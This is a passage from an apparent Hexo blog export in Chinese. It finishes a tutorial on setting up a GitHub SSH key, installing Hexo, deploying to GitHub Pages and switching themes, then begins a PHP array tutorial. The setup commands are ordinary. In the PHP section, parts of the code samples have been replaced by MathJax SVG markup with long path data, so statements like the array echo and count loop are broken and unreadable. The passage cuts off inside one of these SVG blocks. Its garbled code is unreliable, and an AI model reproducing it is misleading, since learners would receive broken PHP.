<p>由于我这里安装过了，出现下面的情况。<br><img src="https://img-blog.csdnimg.cn/20210129232912527.png" alt="在这里插入图片描述"><br>在C盘中的用户中找到.shh的文件<br><img src="https://img-blog.csdnimg.cn/20210129233107317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>记事本打开复制里面的密匙内容<br>然后登录github 在github 上添加刚刚生成的ssh key 把公钥复制粘贴上去。<br><img src="https://img-blog.csdnimg.cn/2021012923331275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210129233435659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>点击后标题随意，将密匙内容复制到文本框中。</p>
<h2 id="4-Hexo安装"><a href="#4-Hexo安装" class="headerlink" title="4.Hexo安装"></a>4.Hexo安装</h2><p>首先创建一个你熟知路径的文件，文件名这里以blog来举例。<br>安装并初始化，blog目录就是博客目录<br>打开命令控制中心进入blog执行命令：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">npm install hexo-cli -g <br>hexo init 这里是你的github的用户名            <br>cd 以用户名创建的新的文件<br>npm install       <br>hexo server <br></code></pre></td></tr></table></figure>
<p>出现：<code>INFO  Validating config INFO  Start processing INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</code><br>那么本地访问<a href="http://localhost:4000/">http://localhost:4000</a> 就可以看到博客网站了，但效果是有限的并且别人无法访问。</p>
<p>接下来部署到Github Page </p>
<h2 id="5-Sublime安装"><a href="#5-Sublime安装" class="headerlink" title="5.Sublime安装"></a>5.Sublime安装</h2><p>为了部署Github page我们需要安装sublime进行文本编译<br>官方网站：<a href="http://www.sublimetext.cn/">http://www.sublimetext.cn/</a><br>但是由于下载的困难，建议翻墙下载，或者在其他网址下载可以使用的安装包。<br><img src="https://img-blog.csdnimg.cn/20210129234635122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="6-hexo发布到github"><a href="#6-hexo发布到github" class="headerlink" title="6.hexo发布到github"></a>6.hexo发布到github</h2><p>首先：用sublime打开blog下创建的用户名文件进行部署（将文件直接拖进去就可以了）打开仓库_config.yml 配置文件，拉到文件末尾，填上如下配置：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"># Deployment<br>## Docs: https:<span class="hljs-comment">//hexo.io/docs/one-command-deployment</span><br>deploy:<br>  type: git<br>  repo: https:<span class="hljs-comment">//github.com/budongshu/budongshu.github.io.git #仓库名字改成自己的</span><br>  branch: main<br></code></pre></td></tr></table></figure>
<p>使用时：Ctrl+s用于保存<br>(注意由于语法问题 ：后加一个空格）</p>
<p>第二: 要安装一个部署插件 hexo-deployer-git<br>首先进入blog的根目录执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure>
<p>第三: 最后执行以下命令就可以部署上传啦</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">hexo g -d<br></code></pre></td></tr></table></figure>
<p>接下来，在浏览器访问网址： https://你的用户名.github.io 就会看到你的博客。</p>
<h2 id="7-hexo主题的更换"><a href="#7-hexo主题的更换" class="headerlink" title="7.hexo主题的更换"></a>7.hexo主题的更换</h2><p>可以去官方挑选自己喜欢的主题：<a href="https://hexo.io/themes/">https://hexo.io/themes/</a><br><img src="https://img-blog.csdnimg.cn/20210130000003101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击这里，学习如何更换<br><img src="https://img-blog.csdnimg.cn/20210130000110753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>首先在博客的项目文件夹下打开git bash执行命令：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">git clone -b master https:<span class="hljs-comment">//github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></code></pre></td></tr></table></figure>
<p>成功后出现themes的文件夹<br><img src="https://img-blog.csdnimg.cn/20210130000337784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后修改_config.yml文件（_config.yml文件在博客的项目文件夹下）<br><img src="https://img-blog.csdnimg.cn/20210130000503295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>theme需要修改为：<code>theme: 主题的名字</code> 之后保存</p>
<p>然后安装pug 以及stylus 的渲染器：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">npm install hexo-renderer-pug hexo-renderer-stylus --save<br><br></code></pre></td></tr></table></figure>
<p>执行hexo s部署到本地运行</p>
<p>然后搭建到Github上：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">hexo clean<br>hexo g<br>hexo d<br></code></pre></td></tr></table></figure>
<p>执行后稍等一会访问：<br><img src="https://img-blog.csdnimg.cn/20210130001224724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功了！</p>
<h2 id="8-hexo命令"><a href="#8-hexo命令" class="headerlink" title="8.hexo命令"></a>8.hexo命令</h2><p><img src="https://img-blog.csdnimg.cn/20210130002025339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为一位小白来讲，搭建的过程的确很艰辛，但是学习的过程也是获益匪浅。希望我的记录不仅能保存下来我的搭建过程也能对你产生帮助。</p>
]]></content>
  </entry>
  <entry>
    <title>PHP入门学习阶段（二）</title>
    <url>/2021/06/05/PHP%E5%85%A5%E9%97%A8%E9%98%B6%E6%AE%B5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h1><p>数组能够在单个变量中存储多个值。</p>
<p>数组是什么：</p>
<p>数组是一个能在单个变量中存储多个值的特殊变量。</p>
<p>如果您有一个项目清单（例如：车名字的清单），将其存储到单个变量中</p>
<p><strong>创建数组</strong><br>在 PHP 中，array() 函数用于创建数组：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">array();<br></code></pre></td></tr></table></figure>
<p>在 PHP 中，有三种类型的数组：</p>
<ul>
<li>数值数组 - 带有数字 ID 键的数组</li>
<li>关联数组 - 带有指定的键的数组，每个键关联一个值</li>
<li>多维数组 - 包含一个或多个数组的数组</li>
</ul>
<p><strong>数值数组</strong><br>在数组中，有序列表总是从0开始设置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">$cars&#x3D;array(&quot;we&quot;,&quot;her&quot;,&quot;she&quot;);<br>echo &quot;hello &quot; . <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="11.872ex" height="2.843ex" style="vertical-align: -0.838ex;" viewBox="0 -863.1 5111.3 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">cars[0] . "," . </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path>
<path stroke-width="1" id="E1-MJMAIN-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-63" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="433" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="963" y="0"></use>
 <use xlink:href="#E1-MJMATHI-73" x="1414" y="0"></use>
 <use xlink:href="#E1-MJMAIN-5B" x="1884" y="0"></use>
 <use xlink:href="#E1-MJMAIN-30" x="2162" y="0"></use>
 <use xlink:href="#E1-MJMAIN-5D" x="2663" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2E" x="2941" y="0"></use>
 <use xlink:href="#E1-MJMAIN-22" x="3386" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="3887" y="0"></use>
 <use xlink:href="#E1-MJMAIN-22" x="4332" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2E" x="4832" y="0"></use>
</g>
</svg>cars[1] . &quot;,&quot; . $cars[2] . &quot;.&quot;;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307191305394.png" alt="在这里插入图片描述"><br><strong>获取数组的长度 - count() 函数</strong><br>count() 函数用于返回数组的长度（元素的数量）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">echo count($cars);<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307191510646.png" alt="在这里插入图片描述"><br>长度为3</p>
<p><strong>遍历数值数组</strong><br>遍历并打印数值数组中的所有值，您可以使用 for 循环，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="19.495ex" height="2.843ex" style="vertical-align: -0.838ex;" viewBox="0 -863.1 8393.6 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">arrlength=count(</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-74" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path>
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6F" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path>
<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMAIN-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="529" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="981" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6C" x="1432" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1731" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6E" x="2197" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="2798" y="0"></use>
 <use xlink:href="#E1-MJMATHI-74" x="3278" y="0"></use>
 <use xlink:href="#E1-MJMATHI-68" x="3640" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3D" x="4494" y="0"></use>
 <use xlink:href="#E1-MJMATHI-63" x="5550" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6F" x="5984" y="0"></use>
 <use xlink:href="#E1-MJMATHI-75" x="6469" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6E" x="7042" y="0"></use>
 <use xlink:href="#E1-MJMATHI-74" x="7642" y="0"></use>
 <use xlink:href="#E1-MJMAIN-28" x="8004" y="0"></use>
</g>
</svg>cars);<br><br>for(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="6.237ex" height="2.509ex" style="vertical-align: -0.671ex;" viewBox="0 -791.3 2685.6 1080.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">x=0;</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
<path stroke-width="1" id="E1-MJMAIN-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3B" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 85 94 103T137 121Q202 121 202 8Q202 -44 183 -94T144 -169T118 -194Q115 -194 106 -186T95 -174Q94 -171 107 -155T137 -107T160 -38Q161 -32 162 -22T165 -4T165 4Q165 5 161 4T142 0Q110 0 94 18T78 60Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-78" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3D" x="850" y="0"></use>
 <use xlink:href="#E1-MJMAIN-30" x="1906" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3B" x="2407" y="0"></use>
</g>
</svg>x&lt;<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="10.44ex" height="2.509ex" style="vertical-align: -0.671ex;" viewBox="0 -791.3 4495 1080.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">arrlength;</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
